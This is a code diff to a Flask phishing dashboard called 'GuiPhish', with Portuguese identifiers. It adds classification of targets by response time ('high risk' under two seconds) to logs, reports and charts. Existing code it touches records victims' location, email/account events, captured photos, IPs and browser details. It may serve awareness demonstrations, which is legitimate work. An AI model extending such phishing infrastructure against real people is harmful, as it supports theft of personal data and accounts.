@@ -82,6 +82,20 @@ def ler_eventos():
     return eventos
 
 
+def classificar_risco(tempo_ms):
+    if not isinstance(tempo_ms, (int, float)):
+        return "N/A"
+
+    tempo = tempo_ms / 1000
+
+    if tempo < 2:
+        return "🔴 Alto risco"
+    elif tempo <= 5:
+        return "🟡 Médio risco"
+    else:
+        return "🟢 Consciente"
+
+
 def calcular_tempos(eventos):
     tempos_resposta = [
         e.get("tempo_resposta")
@@ -101,6 +115,14 @@ def calcular_tempos(eventos):
     return tempo_medio, tempo_minimo, tempo_maximo
 
 
+def calcular_riscos(eventos):
+    risco_alto = len([e for e in eventos if e.get("risco") == "🔴 Alto risco"])
+    risco_medio = len([e for e in eventos if e.get("risco") == "🟡 Médio risco"])
+    risco_baixo = len([e for e in eventos if e.get("risco") == "🟢 Consciente"])
+
+    return risco_alto, risco_medio, risco_baixo
+
+
 def mostrar_logs():
     eventos = ler_eventos()
 
@@ -113,12 +135,14 @@ def mostrar_logs():
     for evento in eventos[-10:]:
         tempo = evento.get("tempo_resposta")
         tempo_formatado = f"{round(tempo / 1000, 2)}s" if isinstance(tempo, (int, float)) else "N/A"
+        risco = evento.get("risco", "N/A")
 
         print(
             f"{GREEN}- {evento.get('timestamp')}{RESET} | "
             f"{evento.get('tipo')} | "
             f"{evento.get('status')} | "
             f"Tempo: {tempo_formatado} | "
+            f"Risco: {risco} | "
             f"IP: {evento.get('ip')}"
         )
 
@@ -138,6 +162,7 @@ def gerar_relatorio():
     total_template = len([e for e in eventos if e.get("tipo") == "template"])
 
     tempo_medio, tempo_minimo, tempo_maximo = calcular_tempos(eventos)
+    risco_alto, risco_medio, risco_baixo = calcular_riscos(eventos)
 
     nome = os.path.join(
         RELATORIOS_DIR,
@@ -153,12 +178,19 @@ def gerar_relatorio():
         f.write(f"Eventos de localização: {total_localizacao}\n")
         f.write(f"Eventos de e-mail/conta: {total_email}\n")
         f.write(f"Eventos de templates: {total_template}\n")
-        f.write(f"Fotos salvas: {len(fotos)}\n")
+        f.write(f"Fotos salvas: {len(fotos)}\n\n")
+
+        f.write("Métricas comportamentais:\n")
         f.write(f"Tempo médio de resposta: {tempo_medio}s\n")
         f.write(f"Menor tempo de resposta: {tempo_minimo}s\n")
         f.write(f"Maior tempo de resposta: {tempo_maximo}s\n\n")
-        f.write("Últimos eventos:\n")
 
+        f.write("Classificação de risco:\n")
+        f.write(f"Alto risco (<2s): {risco_alto}\n")
+        f.write(f"Médio risco (2s a 5s): {risco_medio}\n")
+        f.write(f"Consciente (>5s): {risco_baixo}\n\n")
+
+        f.write("Últimos eventos:\n")
         for evento in eventos[-20:]:
             f.write(json.dumps(evento, ensure_ascii=False) + "\n")
 
@@ -361,6 +393,7 @@ def dashboard():
     total_template = len([e for e in eventos if e.get("tipo") == "template"])
 
     tempo_medio, tempo_minimo, tempo_maximo = calcular_tempos(eventos)
+    risco_alto, risco_medio, risco_baixo = calcular_riscos(eventos)
 
     ultimos_eventos_html = ""
 
@@ -380,6 +413,7 @@ def dashboard():
 
         tempo = e.get("tempo_resposta")
         tempo_formatado = f"{round(tempo / 1000, 2)}s" if isinstance(tempo, (int, float)) else "N/A"
+        risco = e.get("risco", "N/A")
 
         ultimos_eventos_html += f"""
         <tr>
@@ -388,6 +422,7 @@ def dashboard():
             <td>{e.get('status')}</td>
             <td>{e.get('ip')}</td>
             <td>{tempo_formatado}</td>
+            <td>{risco}</td>
             <td>{maps} {email_info} {template_info}</td>
         </tr>
         """
@@ -408,6 +443,7 @@ def dashboard():
 <head>
 <meta charset="UTF-8">
 <title>GuiPhish Dashboard</title>
+<meta http-equiv="refresh" content="10">
 <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 <style>
 body {{
@@ -504,12 +540,20 @@ a {{
 canvas {{
     max-height: 280px;
 }}
+.demo {{
+    color: #f59e0b;
+    font-size: 13px;
+    margin-top: 6px;
+}}
 </style>
 </head>
 <body>
 
 <header>
-    <h1>📊 GuiPhish Dashboard</h1>
+    <div>
+        <h1>📊 GuiPhish Dashboard</h1>
+        <div class="demo">🎭 Modo demonstração ao vivo ativo — atualização automática a cada 10s</div>
+    </div>
     <div>
         <button onclick="location.reload()">🔄 Atualizar</button>
         <a class="btn" href="/logout">🔓 Logout</a>
@@ -527,6 +571,9 @@ canvas {{
         <div class="card"><h2>{tempo_medio}s</h2><p>Tempo médio</p></div>
         <div class="card"><h2>{tempo_minimo}s</h2><p>Menor tempo</p></div>
         <div class="card"><h2>{tempo_maximo}s</h2><p>Maior tempo</p></div>
+        <div class="card"><h2>{risco_alto}</h2><p>🔴 Alto risco</p></div>
+        <div class="card"><h2>{risco_medio}</h2><p>🟡 Médio risco</p></div>
+        <div class="card"><h2>{risco_baixo}</h2><p>🟢 Consciente</p></div>
     </div>
 
     <div class="grid">
@@ -536,10 +583,17 @@ canvas {{
         </div>
 
         <div class="card">
-            <h2>📸 Fotos recentes</h2>
-            <div class="photos">
-                {fotos_html}
-            </div>
+            <h2>🧠 Classificação de risco</h2>
+            <canvas id="graficoRisco"></canvas>
+        </div>
+    </div>
+
+    <br>
+
+    <div class="card">
+        <h2>📸 Fotos recentes</h2>
+        <div class="photos">
+            {fotos_html}
         </div>
     </div>
 
@@ -554,6 +608,7 @@ canvas {{
                 <th>Status</th>
                 <th>IP</th>
                 <th>Tempo</th>
+                <th>Risco</th>
                 <th>Detalhes</th>
             </tr>
             {ultimos_eventos_html}
@@ -595,6 +650,39 @@ new Chart(ctx, {{
         }}
     }}
 }});
+
+const ctxRisco = document.getElementById('graficoRisco');
+
+new Chart(ctxRisco, {{
+    type: 'bar',
+    data: {{
+        labels: ['Alto risco', 'Médio risco', 'Consciente'],
+        datasets: [{{
+            label: 'Classificação',
+            data: [{risco_alto}, {risco_medio}, {risco_baixo}],
+            backgroundColor: ['#ef4444', '#f59e0b', '#22c55e'],
+            borderColor: ['#fca5a5', '#fbbf24', '#86efac'],
+            borderWidth: 1
+        }}]
+    }},
+    options: {{
+        plugins: {{
+            legend: {{
+                labels: {{
+                    color: '#e5e7eb'
+                }}
+            }}
+        }},
+        scales: {{
+            x: {{
+                ticks: {{ color: '#e5e7eb' }}
+            }},
+            y: {{
+                ticks: {{ color: '#e5e7eb' }}
+            }}
+        }}
+    }}
+}});
 </script>
 
 </body>
@@ -608,6 +696,8 @@ def evento():
     data = request.json or {}
 
     tipo = data.get("tipo", "desconhecido")
+    tempo_resposta = data.get("tempo_resposta", None)
+    risco = classificar_risco(tempo_resposta)
 
     evento_log = {
         "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
@@ -616,7 +706,8 @@ def evento():
         "acao": data.get("acao", "N/A"),
         "status": data.get("status", "N/A"),
         "template": data.get("template", "N/A"),
-        "tempo_resposta": data.get("tempo_resposta", "N/A"),
+        "tempo_resposta": tempo_resposta,
+        "risco": risco,
         "user_agent": data.get("userAgent", "N/A"),
         "platform": data.get("platform", "N/A"),
         "language": data.get("language", "N/A"),
@@ -628,7 +719,7 @@ def evento():
     with open(EVENTOS_FILE, "a", encoding="utf-8") as f:
         f.write(json.dumps(evento_log, ensure_ascii=False) + "\n")
 
-    print(f"\n{GREEN}[+] EVENTO REGISTRADO:{RESET} {tipo} | {evento_log['status']} | IP: {request.remote_addr}")
+    print(f"\n{GREEN}[+] EVENTO REGISTRADO:{RESET} {tipo} | {evento_log['status']} | {risco} | IP: {request.remote_addr}")
 
     return jsonify({"ok": True})
 
